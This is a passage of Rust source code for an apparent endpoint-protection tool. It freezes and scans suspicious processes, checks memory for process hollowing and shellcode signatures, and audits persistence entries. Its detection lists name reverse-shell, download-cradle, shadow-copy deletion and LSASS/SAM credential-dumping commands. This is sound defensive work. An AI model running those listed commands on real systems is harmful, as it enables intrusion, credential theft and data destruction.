use crate::quarantine;
use crate::scanner;
use crate::tray_indicator;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use sysinfo::{Pid, System};

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::{CloseHandle, HANDLE},
    System::Threading::{
        OpenProcess, TerminateProcess, PROCESS_QUERY_INFORMATION,
        PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_SUSPEND_RESUME, PROCESS_TERMINATE,
        PROCESS_VM_READ,
    },
};

#[cfg(target_os = "windows")]
#[link(name = "ntdll")]
extern "system" {
    fn NtSuspendProcess(ProcessHandle: HANDLE) -> i32;
    fn NtResumeProcess(ProcessHandle: HANDLE) -> i32;
}

#[cfg(target_os = "windows")]
#[repr(C)]
#[derive(Clone, Copy)]
struct MemoryBasicInformation {
    base_address: *mut std::ffi::c_void,
    allocation_base: *mut std::ffi::c_void,
    allocation_protect: u32,
    partition_id: u16,
    region_size: usize,
    state: u32,
    protect: u32,
    memory_type: u32,
}

#[cfg(target_os = "windows")]
#[link(name = "kernel32")]
extern "system" {
    fn VirtualQueryEx(
        hProcess: HANDLE,
        lpAddress: *const std::ffi::c_void,
        lpBuffer: *mut MemoryBasicInformation,
        dwLength: usize,
    ) -> usize;
    fn ReadProcessMemory(
        hProcess: HANDLE,
        lpBaseAddress: *const std::ffi::c_void,
        lpBuffer: *mut std::ffi::c_void,
        nSize: usize,
        lpNumberOfBytesRead: *mut usize,
    ) -> i32;
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessRiskItem {
    pub pid: u32,
    pub name: String,
    pub exe_path: String,
    pub cmd_line: String,
    pub cpu_usage: f32,
    pub memory_mb: u64,
    pub risk_level: String, // "Safe", "Suspicious", "Critical"
    pub risk_reason: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceEntry {
    pub location_type: String,
    pub name: String,
    pub path: String,
    pub command_or_detail: String,
    pub status: String, // "Verified", "Suspicious"
}

/// Check if an executable path on Windows resides in a high-risk user/temp drop zone
/// (`Downloads`, `AppData\Local\Temp`, `AppData\Roaming`, `Users\Public`).
#[cfg(target_os = "windows")]
pub fn is_high_risk_windows_exec_path(exe_path: &str) -> bool {
    if exe_path.is_empty() {
        return false;
    }
    let lower = exe_path.to_lowercase();
    if lower.contains("genesis-seek") || lower.contains("\\windows\\system32\\") {
        return false;
    }
    lower.contains("\\downloads\\")
        || lower.contains("\\appdata\\local\\temp\\")
        || lower.contains("\\appdata\\roaming\\")
        || lower.contains("\\users\\public\\")
}

/// Windows Pre-Execution / Startup Interception:
/// Immediately suspends all threads of a newly spawned process from a high-risk path via `NtSuspendProcess`,
/// scans its executable image with `scanner.rs`, and either resumes (`NtResumeProcess` + LRU cache) if clean
/// or terminates (`TerminateProcess`) and quarantines (`quarantine.rs`) if malicious.
#[cfg(target_os = "windows")]
pub fn intercept_and_scan_windows_process(
    pid: u32,
    pname: &str,
    exe_path: &str,
    cmd_line: &str,
    ancestor_names: &[String],
) -> Option<(String, String, String)> {
    let path_obj = Path::new(exe_path);
    if !exe_path.is_empty() && scanner::is_cached_clean(path_obj) {
        let (risk, _) =
            evaluate_process_risk_with_ancestors(pname, exe_path, cmd_line, ancestor_names);
        if risk != "Critical" {
            return None;
        }
    }

    let high_risk_path = is_high_risk_windows_exec_path(exe_path);
    let (behav_risk, behav_reason) =
        evaluate_process_risk_with_ancestors(pname, exe_path, cmd_line, ancestor_names);

    if !high_risk_path && behav_risk != "Critical" {
        return None;
    }

    unsafe {
        let mut handle = OpenProcess(
            PROCESS_SUSPEND_RESUME | PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION,
            0,
            pid,
        );
        if handle == 0 {
            handle = OpenProcess(PROCESS_TERMINATE, 0, pid);
        }

        let mut suspended = false;
        if handle != 0 {
            let status = NtSuspendProcess(handle);
            suspended = status >= 0;
        }

        let is_protected_os_bin =
            !exe_path.is_empty() && quarantine::is_protected_system_path(path_obj);

        // Scan the frozen executable image on disk only when it is not already a known-critical behavioral hit
        // on a protected OS binary (avoiding unnecessary multi-MB disk scans before TerminateProcess).
        let file_detection = if !exe_path.is_empty()
            && path_obj.exists()
            && !(behav_risk == "Critical" && is_protected_os_bin)
        {
            scanner::scan_single_file(path_obj).filter(|det| {
                !quarantine::is_allowlisted(&det.sha256)
                    && !det.category.starts_with("RiskWare")
                    && (det.severity == "Critical" || det.severity == "High")
            })
        } else {
            None
        };

        let has_file_threat = file_detection.is_some();
        let is_malicious = has_file_threat || behav_risk == "Critical";

        if is_malicious {
            let (threat_name, reason, sha256, sev) = match file_detection {
                Some(det) => (det.threat_name, det.description, det.sha256, det.severity),
                None => (
                    "Heur.Win32.VolatileProcessExec".to_string(),
                    behav_reason,
                    if is_protected_os_bin {
                        String::new()
                    } else {
                        scanner::compute_file_sha256(path_obj).unwrap_or_default()
                    },
                    "Critical".to_string(),
                ),
            };

            let mut action = if suspended {
                "Suspended via NtSuspendProcess"
            } else {
                "Intercepted"
            }
            .to_string();

            if handle != 0 {
                if TerminateProcess(handle, 1) != 0 {
                    action = "Frozen & Terminated (NtSuspendProcess + TerminateProcess)".to_string();
                }
                CloseHandle(handle);
            }

            // CRITICAL SAFETY: Only quarantine the executable on disk when the binary file itself matched a
            // signature/YARA/heuristic detection AND is not a protected OS/system binary. Behavioral ASR hits
            // (e.g. winword.exe -> powershell.exe or powershell.exe -enc) terminate the malicious process
            // instance without ever deleting/quarantining legitimate OS binaries like powershell.exe or cmd.exe.
            if has_file_threat && !exe_path.is_empty() && path_obj.exists() && !is_protected_os_bin
            {
                if quarantine::quarantine_file(exe_path, &threat_name, &sev, &sha256).is_ok() {
                    action.push_str(" • Quarantined (.gvault)");
                }
            } else if !has_file_threat {
                action.push_str(" • Behavioral Block (OS Binary Preserved)");
            }

            tray_indicator::notify_tray_updated();
            return Some((threat_name, reason, action));
        } else {
            if handle != 0 {
                if suspended {
                    let _ = NtResumeProcess(handle);
                }
                CloseHandle(handle);
            }
            if !exe_path.is_empty() && path_obj.exists() {
                scanner::cache_clean_verdict(path_obj);
            }
            None
        }
    }
}

/// Walk up to 4 ancestor levels (parent, grandparent, etc.) so multi-hop chains
/// like `WINWORD.EXE -> cmd.exe -> powershell.exe` cannot evade parent-child ASR rules.
pub fn resolve_ancestor_names(sys: &System, proc_info: &sysinfo::Process) -> Vec<String> {
    let mut ancestors = Vec::with_capacity(4);
    let mut current_parent = proc_info.parent();
    for _ in 0..4 {
        let Some(ppid) = current_parent else {
            break;
        };
        let Some(p_proc) = sys.process(ppid) else {
            break;
        };
        let p_name = p_proc.name().to_string();
        if !p_name.is_empty() {
            ancestors.push(p_name);
        }
        current_parent = p_proc.parent();
    }
    ancestors
}

/// Inspect the leading bytes of an unbacked private executable memory region (`MEM_PRIVATE` + `PAGE_EXECUTE_*`
/// on Windows, or anonymous `rwxp`/`r-xp` mapping on Linux) for Process Hollowing, Reflective DLL Injection,
/// MZ-stomped Cobalt Strike beacons, unbacked ELF images, or Metasploit/Stephen Fewer block-API shellcode stubs.
pub fn inspect_unbacked_executable_memory(process_name: &str, region_bytes: &[u8]) -> Option<String> {
    if region_bytes.len() < 64 {
        return None;
    }

    // 1. Check for unbacked in-memory PE header (MZ + e_lfanew -> PE\0\0 + valid COFF Machine)
    // Also catches MZ-stomped Cobalt Strike beacons where bytes 0..2 are zeroed out but e_lfanew -> PE\0\0 remains valid.
    let e_lfanew = u32::from_le_bytes([
        region_bytes[0x3C],
        region_bytes[0x3D],
        region_bytes[0x3E],
        region_bytes[0x3F],
    ]) as usize;
    let has_mz = region_bytes[0] == b'M' && region_bytes[1] == b'Z';
    let has_dos_stub = region_bytes
        .windows(18)
        .take(128)
        .any(|w| w == b"This program canno" || w == b"cannot be run in D");

    if (has_mz || has_dos_stub) && (0x40..=region_bytes.len().saturating_sub(24)).contains(&e_lfanew)
    {
        if &region_bytes[e_lfanew..e_lfanew + 4] == b"PE\x00\x00" {
            let machine =
                u16::from_le_bytes([region_bytes[e_lfanew + 4], region_bytes[e_lfanew + 5]]);
            if matches!(machine, 0x8664 | 0x014C | 0xAA64) {
                return Some(format!(
                    "Memory Guard: Unbacked executable PE image in private memory of {} (Reflective DLL / Process Hollowing)",
                    process_name
                ));
            }
        }
    }

    // 2. Check for unbacked in-memory ELF image (\x7FELF with valid 32/64-bit class and endianness)
    if region_bytes.starts_with(b"\x7FELF")
        && matches!(region_bytes[4], 1 | 2)
        && matches!(region_bytes[5], 1 | 2)
    {
        return Some(format!(
            "Memory Guard: Unbacked executable ELF image in anonymous memory of {} (Fileless Reflective Exec)",
            process_name
        ));
    }

    // 3. Check for ReflectiveLoader symbol or Stephen Fewer x64 block-API hash shellcode prologue
    // (\xFC\x48\x83\xE4\xF0\xE8: cld; and rsp, -16; call ...)
    const FEWER_X64_STUB: &[u8] = &[0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8];
    const PEB_GS60_SEQ: &[u8] = &[0x65, 0x48, 0x8B, 0x52, 0x60]; // mov rdx, gs:[rdx+0x60]
    let has_reflective_sym = region_bytes
        .windows(16)
        .any(|w| w == b"ReflectiveLoader");
    let has_fewer_shellcode = region_bytes.windows(FEWER_X64_STUB.len()).any(|w| w == FEWER_X64_STUB)
        && region_bytes.windows(PEB_GS60_SEQ.len()).any(|w| w == PEB_GS60_SEQ);

    if has_reflective_sym || has_fewer_shellcode {
        return Some(format!(
            "Memory Guard: Reflective Loader / PEB-walk shellcode stub detected in private executable memory of {}",
            process_name
        ));
    }

    None
}

/// Scan a live process's virtual address space for unbacked executable PE/ELF headers or reflective shellcode
/// (`VirtualQueryEx` + `ReadProcessMemory` on Windows; `/proc/<pid>/exe` + `/proc/<pid>/maps` on Linux).
pub fn scan_process_memory_for_hollowing(pid: u32, pname: &str) -> Option<String> {
    if pid == 0 || pid == 4 || pid == std::process::id() {
        return None;
    }

    #[cfg(target_os = "windows")]
    unsafe {
        const MEM_COMMIT: u32 = 0x1000;
        const MEM_PRIVATE: u32 = 0x20000;
        const PAGE_GUARD: u32 = 0x100;
        const PAGE_NOACCESS: u32 = 0x01;
        const PAGE_EXECUTE: u32 = 0x10;
        const PAGE_EXECUTE_READ: u32 = 0x20;
        const PAGE_EXECUTE_READWRITE: u32 = 0x40;
        const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;

        let mut handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid);
        if handle == 0 {
            handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, 0, pid);
        }
        if handle == 0 {
            return None;
        }

        let mut addr: usize = 0;
        let mut regions_walked = 0usize;
        let mut exec_regions_checked = 0usize;
        let mut finding = None;

        while regions_walked < 1024 && exec_regions_checked < 64 {
            let mut mbi: MemoryBasicInformation = std::mem::zeroed();
            let queried = VirtualQueryEx(
                handle,
                addr as *const std::ffi::c_void,
                &mut mbi,
                std::mem::size_of::<MemoryBasicInformation>(),
            );
            if queried == 0 || mbi.region_size == 0 {
                break;
            }
            regions_walked += 1;

            let low_protect = mbi.protect & 0xFF;
            let is_exec = matches!(
                low_protect,
                PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY
            );
            if mbi.state == MEM_COMMIT
                && mbi.memory_type == MEM_PRIVATE
                && is_exec
                && (mbi.protect & PAGE_GUARD) == 0
                && (mbi.protect & PAGE_NOACCESS) == 0
                && mbi.region_size >= 1024
            {
                exec_regions_checked += 1;
                let mut buf = [0u8; 1024];
                let mut bytes_read: usize = 0;
                let ok = ReadProcessMemory(
                    handle,
                    mbi.base_address,
                    buf.as_mut_ptr() as *mut std::ffi::c_void,
                    buf.len(),
                    &mut bytes_read,
                );
                if ok != 0 && bytes_read >= 64 {
                    if let Some(reason) = inspect_unbacked_executable_memory(pname, &buf[..bytes_read])
                    {
                        finding = Some(reason);
                        break;
                    }
                }
            }

            let Some(next_addr) = (mbi.base_address as usize).checked_add(mbi.region_size) else {
                break;
            };
            if next_addr <= addr {
                break;
            }
            addr = next_addr;
        }

        CloseHandle(handle);
        return finding;
    }

    #[cfg(target_os = "linux")]
    {
        use std::os::unix::fs::FileExt;
        // 1. Check /proc/<pid>/exe symlink for memfd_create or deleted volatile binaries
        if let Ok(exe_target) = fs::read_link(format!("/proc/{}/exe", pid)) {
            let target_str = exe_target.to_string_lossy();
            let lower = target_str.to_ascii_lowercase();
            if lower.contains("memfd:")
                || ((lower.starts_with("/tmp/")
                    || lower.starts_with("/dev/shm/")
                    || lower.starts_with("/var/tmp/"))
                    && lower.ends_with("(deleted)"))
            {
                return Some(format!(
                    "Memory Guard: Fileless execution from anonymous memfd or deleted volatile binary ({})",
                    target_str
                ));
            }
        }

        // 2. Walk /proc/<pid>/maps for anonymous executable mappings containing unbacked ELF/shellcode
        let Ok(maps) = fs::read_to_string(format!("/proc/{}/maps", pid)) else {
            return None;
        };
        let Ok(mem_file) = fs::File::open(format!("/proc/{}/mem", pid)) else {
            return None;
        };
        let mut checked = 0usize;
        for line in maps.lines() {
            if checked >= 64 {
                break;
            }
            let mut parts = line.split_whitespace();
            let Some(range) = parts.next() else { continue };
            let Some(perms) = parts.next() else { continue };
            if !perms.contains('x') || !perms.contains('r') {
                continue;
            }
            let _offset = parts.next();
            let _dev = parts.next();
            let _inode = parts.next();
            let pathname = parts.next().unwrap_or("");
            let is_anon_or_memfd = pathname.is_empty() || pathname.contains("memfd:");
            if !is_anon_or_memfd {
                continue;
            }
            let Some((start_hex, _)) = range.split_once('-') else {
                continue;
            };
            let Ok(start_addr) = u64::from_str_radix(start_hex, 16) else {
                continue;
            };
            checked += 1;
            let mut buf = [0u8; 1024];
            if let Ok(n) = mem_file.read_at(&mut buf, start_addr) {
                if n >= 64 {
                    if let Some(reason) = inspect_unbacked_executable_memory(pname, &buf[..n]) {
                        return Some(reason);
                    }
                }
            }
        }
        return None;
    }

    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    {
        let _ = (pid, pname);
        None
    }
}

pub fn inspect_running_processes() -> Vec<ProcessRiskItem> {
    let mut sys = System::new_all();
    std::thread::sleep(sysinfo::MINIMUM_CPU_UPDATE_INTERVAL);
    sys.refresh_processes();

    let self_pid = std::process::id();
    let mut results = Vec::new();

    for (pid, process) in sys.processes() {
        if pid.as_u32() == self_pid {
            continue;
        }
        let name = process.name().to_string();
        let exe_path = process
            .exe()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_default();
        let cmd_line = process.cmd().join(" ");
        let memory_mb = process.memory() / (1024 * 1024);
        let cpu_usage = process.cpu_usage();

        let ancestors = resolve_ancestor_names(&sys, process);
        let (mut risk_level, mut risk_reason) =
            evaluate_process_risk_with_ancestors(&name, &exe_path, &cmd_line, &ancestors);
        if risk_level != "Critical" {
            if let Some(mem_reason) = scan_process_memory_for_hollowing(pid.as_u32(), &name) {
                risk_level = "Critical".to_string();
                risk_reason = mem_reason;
            }
        }

        if risk_level != "Safe" || memory_mb > 35 || cpu_usage > 2.0 {
            results.push(ProcessRiskItem {
                pid: pid.as_u32(),
                name,
                exe_path,
                cmd_line,
                cpu_usage: (cpu_usage * 10.0).round() / 10.0,
                memory_mb,
                risk_level,
                risk_reason,
            });
        }
    }

    results.sort_by(|a, b| {
        let rank = |lvl: &str| match lvl {
            "Critical" => 0,
            "Suspicious" => 1,
            _ => 2,
        };
        rank(&a.risk_level)
            .cmp(&rank(&b.risk_level))
            .then_with(|| b.memory_mb.cmp(&a.memory_mb))
    });

    results.truncate(80);
    results
}

/// Evaluate process risk including single-parent ASR behavioral rules.
#[allow(dead_code)]
pub fn evaluate_process_risk_with_parent(
    name: &str,
    exe_path: &str,
    cmd_line: &str,
    parent_name: Option<&str>,
) -> (String, String) {
    let ancestors: Vec<String> = parent_name.into_iter().map(|s| s.to_string()).collect();
    evaluate_process_risk_with_ancestors(name, exe_path, cmd_line, &ancestors)
}

/// Evaluate process risk including multi-ancestor ASR behavioral rules (Office/PDF readers spawning shells/LOLBins).
pub fn evaluate_process_risk_with_ancestors(
    name: &str,
    exe_path: &str,
    cmd_line: &str,
    ancestor_names: &[String],
) -> (String, String) {
    let (base_level, base_reason) = evaluate_process_risk(name, exe_path, cmd_line);
    if base_level == "Critical" {
        return (base_level, base_reason);
    }

    let c_name = name.to_ascii_lowercase();
    let lower_cmd = cmd_line.to_ascii_lowercase();

    for p_raw in ancestor_names {
        let p_name = p_raw.to_ascii_lowercase();

        let is_win_office_or_pdf = matches!(
            p_name.as_str(),
            "winword.exe"
                | "excel.exe"
                | "powerpnt.exe"
                | "outlook.exe"
                | "mspub.exe"
                | "msaccess.exe"
                | "acrord32.exe"
                | "acrobat.exe"
                | "foxitreader.exe"
        );
        let is_win_shell_or_lolbin = matches!(
            c_name.as_str(),
            "cmd.exe"
                | "powershell.exe"
                | "pwsh.exe"
                | "wscript.exe"
                | "cscript.exe"
                | "mshta.exe"
                | "rundll32.exe"
                | "regsvr32.exe"
                | "certutil.exe"
                | "bitsadmin.exe"
                | "hh.exe"
        );

        if is_win_office_or_pdf && is_win_shell_or_lolbin {
            return (
                "Critical".to_string(),
                format!(
                    "ASR Behavioral Rule: Office/PDF application ({}) spawned shell/LOLBin ({})",
                    p_raw, name
                ),
            );
        }

        let is_linux_doc_or_pdf = matches!(
            p_name.as_str(),
            "soffice.bin"
                | "evince"
                | "okular"
                | "zathura"
                | "xreader"
                | "atril"
                | "qpdfview"
                | "mupdf"
        );
        let is_linux_shell_or_net = matches!(
            c_name.as_str(),
            "sh"
                | "bash"
                | "dash"
                | "zsh"
                | "python"
                | "python3"
                | "perl"
                | "curl"
                | "wget"
                | "nc"
                | "ncat"
                | "cmd.exe"
                | "powershell.exe"
                | "pwsh.exe"
        );

        if is_linux_doc_or_pdf && is_linux_shell_or_net {
            let has_suspect_payload = is_suspicious_reader_child(c_name.as_str(), &lower_cmd);
            if has_suspect_payload {
                return (
                    "Critical".to_string(),
                    format!(
                        "ASR Behavioral Rule: Document/PDF reader ({}) spawned shell/downloader ({}) with suspect payload",
                        p_raw, name
                    ),
                );
            }
        }
    }

    (base_level, base_reason)
}

/// True when the process image name itself is a PowerShell host.
fn lower_name_is_powershell(lower_name: &str) -> bool {
    matches!(
        lower_name,
        "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe" | "powershell_ise.exe"
    )
}

/// Linux document/PDF reader child rule: only a genuine download-and-execute / reverse-shell / staged-payload
/// pattern is suspicious. Plain `http(s)://` links (e.g. `sh /usr/bin/xdg-open https://...` when the user clicks
/// a hyperlink in a PDF) and bare `/tmp/` references are NOT sufficient on their own.
fn is_suspicious_reader_child(c_name: &str, lower_cmd: &str) -> bool {
    // Benign link / file / mail handlers launched by readers
    let toks: Vec<&str> = lower_cmd.split_whitespace().collect();
    let invokes_opener = toks.iter().any(|t| {
        let base = t.rsplit('/').next().unwrap_or(t);
        matches!(
            base,
            "xdg-open" | "gio" | "gvfs-open" | "kde-open" | "kde-open5" | "exo-open" | "sensible-browser"
                | "x-www-browser" | "lpr" | "lp"
        )
    });
    let has_exec_pattern = lower_cmd.contains("/dev/tcp/")
        || lower_cmd.contains("chmod +x")
        || lower_cmd.contains("base64 -d")
        || lower_cmd.contains("base64 --decode")
        || lower_cmd.contains("| sh")
        || lower_cmd.contains("|sh")
        || lower_cmd.contains("| bash")
        || lower_cmd.contains("|bash")
        || lower_cmd.contains("nc -e")
        || lower_cmd.contains("ncat -e")
        || lower_cmd.contains("mkfifo")
        || lower_cmd.contains("/dev/shm/")
        || scanner::is_powershell_encoded_invocation(lower_cmd);
    if has_exec_pattern {
        return true;
    }
    if invokes_opener {
        return false;
    }
    // Direct network tools spawned by a reader, or a shell fetching from the network into a writable drop zone
    let direct_net_tool = matches!(c_name, "curl" | "wget" | "nc" | "ncat");
    let fetches = lower_cmd.contains("curl ") || lower_cmd.contains("wget ");
    let drop_zone = lower_cmd.contains("/tmp/") || lower_cmd.contains("/var/tmp/");
    direct_net_tool || (fetches && drop_zone)
}

pub fn evaluate_process_risk(name: &str, exe_path: &str, cmd_line: &str) -> (String, String) {
    let lower_exe = exe_path.to_lowercase();
    let lower_cmd = cmd_line.to_lowercase();
    let lower_name = name.to_lowercase();

    let is_appimage_mount = lower_exe.starts_with("/tmp/.mount_");

    // Check 1a: Execution from Linux shared-memory RAM disk (/dev/shm/) is always Critical
    if !is_appimage_mount && lower_exe.starts_with("/dev/shm/") {
        return (
            "Critical".to_string(),
            "Binary executing directly from volatile shared-memory RAM disk (/dev/shm/)".to_string(),
        );
    }

    // Check 2: Suspicious command line payloads
    let is_ps_encoded = lower_name_is_powershell(&lower_name)
        && scanner::has_encoded_powershell_flag(&lower_cmd)
        || scanner::is_powershell_encoded_invocation(&lower_cmd);
    if is_ps_encoded
        || lower_cmd.contains("-encodedcommand")
        || lower_cmd.contains("/dev/tcp/")
        || lower_cmd.contains("stratum+tcp")
        || lower_cmd.contains("xmrig")
        || lower_cmd.contains("nc -e /bin/") || lower_cmd.contains("vssadmin delete shadows") || lower_cmd.contains("wmic shadowcopy delete") || lower_cmd.contains("wbadmin delete catalog") || lower_cmd.contains("recoveryenabled no") || lower_cmd.contains("glibc_tunables=") || lower_cmd.contains("unshare -ur") || lower_cmd.contains("nft_verdict") || lower_cmd.contains("nftnl_chain_alloc") || lower_cmd.contains("ipv6exthdrdestopt") || (lower_cmd.contains("certutil") && lower_cmd.contains("-urlcache")) || lower_cmd.contains("frombase64string") || lower_cmd.contains("downloadstring") || (lower_name.contains("mshta") && (lower_cmd.contains("http://") || lower_cmd.contains("https://") || lower_cmd.contains("javascript:") || lower_cmd.contains("vbscript:") || lower_cmd.contains("\u{202e}")))
    {
        return (
            "Critical".to_string(),
            "Command-line contains obfuscated payload, reverse shell, LOLBin download cradle, or CVE exploit arguments".to_string(),
        );
    }

    // Check 2b: ASR Behavioral Rule — Credential Dumping (LSASS / SAM / NTDS) & WMI / Scheduled Task Persistence
    if (lower_cmd.contains("comsvcs") && lower_cmd.contains("minidump"))
        || (lower_cmd.contains("procdump") && lower_cmd.contains("lsass"))
        || lower_cmd.contains("sekurlsa")
        || lower_cmd.contains("reg save hklm\\sam")
        || lower_cmd.contains("reg save hklm\\system")
        || lower_cmd.contains("ntds.dit")
    {
        return (
            "Critical".to_string(),
            "ASR Behavioral Rule: Credential dumping / LSASS or SAM hive extraction attempt detected"
                .to_string(),
        );
    }

    if lower_cmd.contains("wmic process call create")
        || lower_cmd.contains("register-wmievent")
        || lower_cmd.contains("commandlineeventconsumer")
        || (lower_cmd.contains("schtasks")
            && lower_cmd.contains("/create")
            && (lower_cmd.contains("\\appdata\\")
                || lower_cmd.contains("\\users\\public\\")
                || lower_cmd.contains("\\windows\\temp\\")
                || lower_cmd.contains("/tmp/")
                || scanner::is_powershell_encoded_invocation(&lower_cmd)
                || lower_cmd.contains("frombase64string")
                || lower_cmd.contains("downloadstring")
                || lower_cmd.contains("mshta")
                || lower_cmd.contains("regsvr32")
                || lower_cmd.contains("rundll32")
                || lower_cmd.contains("http://")
                || lower_cmd.contains("https://")))
    {
        return (
            "Critical".to_string(),
            "ASR Behavioral Rule: Suspicious WMI or Scheduled Task persistence execution"
                .to_string(),
        );
    }

    if lower_name == "genesis-seek.exe"
        || lower_name == "genesis-seek"
        || lower_name == "msiexec.exe"
    {
        return (
            "Safe".to_string(),
            "Verified Genesis Seek / Windows Installer service".to_string(),
        );
    }

    // Check 1b: Execution from temporary directories is Suspicious (suspended & file-scanned on Windows; allowed to resume if binary is clean)
    if !is_appimage_mount
        && (lower_exe.starts_with("/tmp/")
            || lower_exe.starts_with("/var/tmp/")
            || lower_exe.contains("\\appdata\\local\\temp\\"))
    {
        return (
            "Suspicious".to_string(),
            "Binary executing from temporary directory (inspected by Pre-Execution Guard)".to_string(),
        );
    }

    // Check 3: Windows svchost / lsass masquerading outside System32
    if (lower_name == "svchost.exe" || lower_name == "lsass.exe" || lower_name == "csrss.exe")
        && !lower_exe.is_empty()
        && !lower_exe.contains("\\windows\\system32")
    {
        return (
            "Critical".to_string(),
            "System process name masquerading outside Windows\\System32".to_string(),
        );
    }

    // Check 4: Execution from Downloads directory
    if lower_exe.contains("/downloads/") || lower_exe.contains("\\downloads\\") {
        return (
            "Suspicious".to_string(),
            "Executable running directly from user Downloads folder".to_string(),
        );
    }

    ("Safe".to_string(), "Normal process behavior".to_string())
}

pub fn terminate_process(pid_num: u32) -> Result<String, String> {
    let mut sys = System::new_all();
    sys.refresh_all();
    let pid = Pid::from_u32(pid_num);
    if let Some(process) = sys.process(pid) {
        let name = process.name().to_string();
        if process.kill() {
            Ok(format!("Terminated process {} (PID {})", name, pid_num))
        } else {
            Err(format!(
                "OS denied permission to terminate {} (PID {})",
                name, pid_num
            ))
        }
    } else {
        Err(format!("Process PID {} not found", pid_num))
    }
}

fn is_suspicious_persistence_cmd(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    [
        "/tmp/",
        "/dev/shm/",
        "\\appdata\\local\\temp\\",
        "\\users\\public\\",
        "curl ",
        "wget ",
        "base64",
        "-encodedcommand",
        "powershell",
        "mshta",
        "rundll32",
        "regsvr32",
        "/dev/tcp/",
        "ld_preload",
        "nc -e",
        "certutil",
    ]
    .iter()
    .any(|tok| lower.contains(tok))
}

/// Immediately terminate and quarantine non-system processes running from high-risk temp/download
/// directories when the Ransomware Canary decoy is modified.
pub fn neutralize_suspicious_processes_on_canary_trip() -> Vec<String> {
    let mut actions = Vec::new();
    let self_pid = std::process::id();
    let mut sys = System::new_all();
    sys.refresh_all();

    for (pid, proc_info) in sys.processes() {
        if pid.as_u32() == self_pid {
            continue;
        }
        let Some(exe) = proc_info.exe() else {
            continue;
        };
        let lower = exe.to_string_lossy().to_lowercase();
        if lower.is_empty()
            || lower.contains("genesis-seek")
            || lower.starts_with("/tmp/.mount_")
            || lower.contains("\\windows\\system32\\")
        {
            continue;
        }
        let in_volatile_zone = lower.contains("\\downloads\\")
            || lower.contains("/downloads/")
            || lower.contains("\\appdata\\local\\temp\\")
            || lower.starts_with("/tmp/")
            || lower.starts_with("/var/tmp/")
            || lower.starts_with("/dev/shm/");
        if !in_volatile_zone {
            continue;
        }

        let name = proc_info.name().to_string();
        let sha256 = scanner::compute_file_sha256(exe).unwrap_or_default();
        if proc_info.kill() {
            let _ = quarantine::quarantine_file(
                &exe.to_string_lossy(),
                "Ransomware.CanaryTrigger",
                "Critical",
                &sha256,
            );
            actions.push(format!(
                "Terminated & quarantined {} (PID {}) at {}",
                name,
                pid.as_u32(),
                exe.display()
            ));
        } else {
            actions.push(format!(
                "Identified suspect process {} (PID {}) at {} (kill denied by OS)",
                name,
                pid.as_u32(),
                exe.display()
            ));
        }
    }

    if !actions.is_empty() {
        tray_indicator::notify_tray_updated();
    }
    actions
}

#[cfg(target_os = "windows")]
fn audit_windows_registry_run_keys(hooks: &mut Vec<PersistenceEntry>) {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let keys = [
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
    ];
    for key in keys {
        let Ok(out) = std::process::Command::new("reg")
            .args(["query", key])
            .creation_flags(CREATE_NO_WINDOW)
            .output()
        else {
            continue;
        };
        if !out.status.success() {
            continue;
        }
        let text = String::from_utf8_lossy(&out.stdout);
        for line in text.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.eq_ignore_ascii_case(key) || trimmed.starts_with("HKEY_") {
                continue;
            }
            let parts: Vec<&str> = trimmed.splitn(3, "    ").filter(|s| !s.is_empty()).collect();
            if parts.len() >= 3 && parts[1].starts_with("REG_") {
                let val_name = parts[0].trim().to_string();
                let val_data = parts[2].trim().to_string();
                let status = if is_suspicious_persistence_cmd(&val_data) {
                    "Suspicious"
                } else {
                    "Verified"
                };
                hooks.push(PersistenceEntry {
                    location_type: "Windows Registry Run Key".to_string(),
                    name: val_name,
                    path: key.to_string(),
                    command_or_detail: val_data,
                    status: status.to_string(),
                });
            }
        }
    }
}

/// Inspect cross-platform startup and persistence hooks (Linux & Windows).
pub fn inspect_persistence_hooks() -> Vec<PersistenceEntry> {
    let mut hooks = Vec::new();

    if let Some(config_dir) = dirs::config_dir() {
        let autostart = config_dir.join("autostart");
        if autostart.exists() {
            if let Ok(entries) = fs::read_dir(&autostart) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_file() {
                        let content = fs::read_to_string(&path).unwrap_or_default();
                        let exec_line = content
                            .lines()
                            .find(|l| l.starts_with("Exec="))
                            .unwrap_or("Exec=(unspecified)")
                            .to_string();
                        let status = if is_suspicious_persistence_cmd(&exec_line) {
                            "Suspicious"
                        } else {
                            "Verified"
                        };
                        hooks.push(PersistenceEntry {
                            location_type: "User Autostart (.desktop)".to_string(),
                            name: entry.file_name().to_string_lossy().to_string(),
                            path: path.to_string_lossy().to_string(),
                            command_or_detail: exec_line,
                            status: status.to_string(),
                        });
                    }
                }
            }
        }

        let systemd_user = config_dir.join("systemd").join("user");
        if systemd_user.exists() {
            if let Ok(entries) = fs::read_dir(&systemd_user) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_file() {
                        let content = fs::read_to_string(&path).unwrap_or_default();
                        let exec_line = content
                            .lines()
                            .find(|l| l.trim().starts_with("ExecStart="))
                            .unwrap_or("Unit Configuration")
                            .trim()
                            .to_string();
                        let status = if is_suspicious_persistence_cmd(&exec_line) {
                            "Suspicious"
                        } else {
                            "Verified"
                        };
